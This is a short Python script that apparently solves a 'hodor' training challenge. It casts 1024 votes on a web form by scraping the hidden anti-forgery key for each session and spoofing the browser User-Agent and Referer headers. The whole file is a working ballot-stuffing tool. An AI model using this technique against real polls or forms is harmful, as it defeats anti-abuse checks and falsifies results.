#!/usr/bin/python3
"""
hodor challenge level 2
"""


from bs4 import BeautifulSoup
import requests


page = 'http://158.69.76.135/level2.php'
user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) "
              "Gecko/20100101 Firefox/64.0")

header = {
    "User-Agent": user_agent,
    "referer": page
}

vote = {
    "id":"1448",
    "holdthedoor": "Submit",
    "key": ""
}

if __name__ == "__main__":
    vote_times = 1024
    for i in range(0, vote_times):
        print('vote #: ' + str(i + 1))
        print('processing...........')
        session = requests.session()
        pge = session.get(page)
        soup = BeautifulSoup(pge.text, "html.parser")

        hidden_val = soup.find("form", {"method": "post"})
        hidden_val = hidden_val.find("input", {"type": "hidden"})
        vote["key"] = hidden_val["value"]


        session.post(page, data=vote)
        print('---------------------')
